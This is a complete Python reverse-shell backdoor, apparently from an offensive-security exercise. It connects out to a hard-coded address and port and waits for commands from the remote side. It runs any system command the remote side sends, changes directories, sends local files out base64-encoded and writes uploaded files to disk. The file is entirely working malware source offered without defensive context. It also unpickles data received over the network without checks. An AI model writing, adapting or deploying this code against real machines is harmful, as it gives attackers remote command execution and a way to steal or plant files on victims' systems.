import socket
import subprocess
import pickle
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[+] Connecting to " + ip)
        try:
            self.connection.connect((ip, port))
            print("[+] Connection established")
        except socket.error:
            print("[-] Server is offline"); exit()
    
    def send(self, data):
        self.connection.send(pickle.dumps(data))
    
    def receive(self):
        return pickle.loads(self.connection.recv(4096))
    
    def interrupt(self):
        print("\r[-] Closing session...")
        self.connection.close(); exit()
    
    def run(self):
        try:
            while True:
                try:
                    command = self.receive()
                    if command[0] == "exit":
                        self.interrupt()
                    elif command[0] == "cd" and len(command) > 1:
                        res = self.change_dir(command[1])
                    elif command[0] == "download":
                        res = self.read_file(command[1])
                    elif command[0] == "upload":
                        res = self.write_file(command[1], command[2])
                    else:
                        res = self.execute_sys_command(command)
                except Exception:
                    res = b"[-] Error occured while execution "
                self.send(res)
        except KeyboardInterrupt:
            self.interrupt()

    def change_dir(self, path):
        os.chdir(path)
        return ("[+] Changing working dir to " + path).encode("utf-8")
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return ("[+] " + path + " uploaded successfully").encode("utf-8")
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def execute_sys_command(self, command):
        return subprocess.check_output(command)

if __name__ == "__main__":
    backdoor = Backdoor("192.168.159.146", 3333)
    backdoor.run()